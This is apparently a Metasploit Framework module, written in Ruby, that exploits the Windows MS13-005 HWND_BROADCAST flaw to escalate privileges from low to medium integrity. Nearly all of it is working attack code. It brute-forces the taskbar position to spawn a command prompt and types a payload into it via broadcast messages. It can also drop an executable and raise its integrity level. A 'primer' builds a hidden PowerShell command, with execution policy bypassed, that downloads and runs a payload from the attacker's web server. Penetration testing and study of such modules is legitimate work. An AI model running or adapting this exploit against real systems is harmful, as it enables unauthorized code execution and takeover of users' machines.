##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'
 
class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking
 
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper
  include Msf::Post::File
 
  def initialize(info={})
    super( update_info( info,
      'Name'    => 'MS13-005 HWND_BROADCAST Low to Medium Integrity Privilege Escalation',
      'Description'  => %q{
        The Windows kernel does not properly isolate broadcast messages from low integrity
        applications from medium or high integrity applications. This allows commands to be
        broadcasted to an open medium or high integrity command prompts allowing escalation
        of privileges. We can spawn a medium integrity command prompt, after spawning a low
        integrity command prompt, by using the Win+Shift+# combination to specify the
        position of the command prompt on the taskbar. We can then broadcast our command
        and hope that the user is away and doesn't corrupt it by interacting with the UI.
        Broadcast issue affects versions  Windows Vista, 7, 8, Server 2008, Server 2008 R2,
        Server 2012, RT. But Spawning a command prompt with the shortcut key does not work
        in Vista so you will have to check if the user is already running a command prompt
        and set SPAWN_PROMPT false. The WEB technique will execute a powershell encoded
        payload from a Web location.  The FILE technique will drop an executable to the
        file system, set it to medium integrity and execute it. The TYPE technique will
        attempt to execute a powershell encoded payload directly from the command line but
        it may take some time to complete.
      },
      'License'  => MSF_LICENSE,
      'Author'  =>
        [
          'Tavis Ormandy', # Discovery
          'Axel Souchet',  # @0vercl0k POC
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit module
        ],
      'Platform'  => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'  =>
      [
        [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
        [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate'=> "Nov 27 2012",
      'References' =>
        [
          [ 'CVE', '2013-0008' ],
          [ 'MSB', 'MS13-005' ],
          [ 'OSVDB', '88966'],
          [ 'URL', 'http://blog.cmpxchg8b.com/2013/02/a-few-years-ago-while-working-on.html' ]
        ]
    ))
 
    register_options(
      [
        OptBool.new('SPAWN_PROMPT', [true, 'Attempts to spawn a medium integrity command prompt', true]),
        OptEnum.new('TECHNIQUE', [true, 'Delivery technique', 'WEB', ['WEB','FILE','TYPE']]),
        OptString.new('CUSTOM_COMMAND', [false, 'Custom command to type'])
      ], self.class
    )
 
  end
 
  def low_integrity_level?
    tmp_dir = expand_path("%USERPROFILE%")
    cd(tmp_dir)
    new_dir = "#{rand_text_alpha(5)}"
    begin
      session.shell_command_token("mkdir #{new_dir}")
    rescue
      return true
    end
 
    if directory?(new_dir)
      session.shell_command_token("rmdir #{new_dir}")
      return false
    else
      return true
    end
  end
 
  def win_shift(number)
    vk = 0x30 + number
    bscan = 0x81 + number
    client.railgun.user32.keybd_event('VK_LWIN', 0x5b, 0, 0)
    client.railgun.user32.keybd_event('VK_LSHIFT', 0xAA, 0, 0)
    client.railgun.user32.keybd_event(vk, bscan, 0, 0)
    client.railgun.user32.keybd_event(vk, bscan, 'KEYEVENTF_KEYUP', 0)
    client.railgun.user32.keybd_event('VK_LWIN', 0x5b, 'KEYEVENTF_KEYUP', 0)
    client.railgun.user32.keybd_event('VK_LSHIFT', 0xAA, 'KEYEVENTF_KEYUP', 0)
  end
 
  def count_cmd_procs
    count = 0
    client.sys.process.each_process do |proc|
      if proc['name'] == 'cmd.exe'
        count += 1
      end
    end
 
    vprint_status("Cmd prompt count: #{count}")
    return count
  end
 
  def cleanup
    if datastore['SPAWN_PROMPT'] and @hwin
      vprint_status("Rehiding window...")
      client.railgun.user32.ShowWindow(@hwin, 0)
    end
    super
  end
 
  def exploit
    # First of all check if the session is running on Low Integrity Level.
    # If it isn't doesn't worth continue
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
    fail_with(Exploit::Failure::NotVulnerable, "Not running at Low Integrity!") unless low_integrity_level?
 
    # If the user prefers to drop payload to FILESYSTEM, try to cd to %TEMP% which
    # hopefully will be "%TEMP%/Low" (IE Low Integrity Process case) where a low
    # integrity process can write.
    drop_to_fs = false
    if datastore['TECHNIQUE'] == 'FILE'
      payload_file = "#{rand_text_alpha(5+rand(3))}.exe"
      begin
        tmp_dir = expand_path("%TEMP%")
        tmp_dir << "\\Low" unless tmp_dir[-3,3] =~ /Low/i
        cd(tmp_dir)
        print_status("Trying to drop payload to #{tmp_dir}...")
        if write_file(payload_file, generate_payload_exe)
          print_good("Payload dropped successfully, exploiting...")
          drop_to_fs = true
          register_file_for_cleanup(payload_file)
          payload_path = tmp_dir
        else
          print_error("Failed to drop payload to File System, will try to execute the payload from PowerShell, which requires HTTP access.")
          drop_to_fs = false
        end
      rescue ::Rex::Post::Meterpreter::RequestError
        print_error("Failed to drop payload to File System, will try to execute the payload from PowerShell, which requires HTTP access.")
        drop_to_fs = false
      end
    end
 
    if drop_to_fs
      command = "cd #{payload_path} && icacls #{payload_file} /setintegritylevel medium && #{payload_file}"
      make_it(command)
    elsif datastore['TECHNIQUE'] == 'TYPE'
      if datastore['CUSTOM_COMMAND']
        command = datastore['CUSTOM_COMMAND']
      else
        print_warning("WARNING: It can take a LONG TIME to broadcast the cmd script to execute the psh payload")
        command = cmd_psh_payload(payload.encoded)
      end
      make_it(command)
    else
      super
    end
  end
 
  def primer
    url = get_uri()
    download_and_run = "IEX ((new-object net.webclient).downloadstring('#{url}'))"
    command = "powershell.exe -w hidden -nop -ep bypass -c #{download_and_run}"
    make_it(command)
  end
 
  def make_it(command)
    if datastore['SPAWN_PROMPT']
      @hwin = client.railgun.kernel32.GetConsoleWindow()['return']
      if @hwin == nil
        @hwin = client.railgun.user32.GetForegroundWindow()['return']
      end
      client.railgun.user32.ShowWindow(@hwin, 0)
      client.railgun.user32.ShowWindow(@hwin, 5)
 
      # Spawn low integrity cmd.exe
      print_status("Spawning Low Integrity Cmd Prompt")
      windir = client.fs.file.expand_path("%windir%")
      li_cmd_pid = client.sys.process.execute("#{windir}\\system32\\cmd.exe", nil, {'Hidden' => false }).pid
 
      count = count_cmd_procs
      spawned = false
      print_status("Bruteforcing Taskbar Position")
      9.downto(1) do |number|
        vprint_status("Attempting Win+Shift+#{number}")
        win_shift(number)
        sleep(1)
 
        if count_cmd_procs > count
          print_good("Spawned Medium Integrity Cmd Prompt")
          spawned = true
          break
        end
      end
 
      client.sys.process.kill(li_cmd_pid)
 
      fail_with(Exploit::Failure::Unknown, "No Cmd Prompt spawned") unless spawned
    end
 
    print_status("Broadcasting payload command to prompt... I hope the user is asleep!")
    command.each_char do |c|
      print c if command.length < 200
      client.railgun.user32.SendMessageA('HWND_BROADCAST', 'WM_CHAR', c.unpack('c').first, 0)
    end
    print_line
    print_status("Executing command...")
    client.railgun.user32.SendMessageA('HWND_BROADCAST', 'WM_CHAR', 'VK_RETURN', 0)
  end
 
  def on_request_uri(cli, request)
    print_status("Delivering Payload")
    data = Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)
    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
  end
end
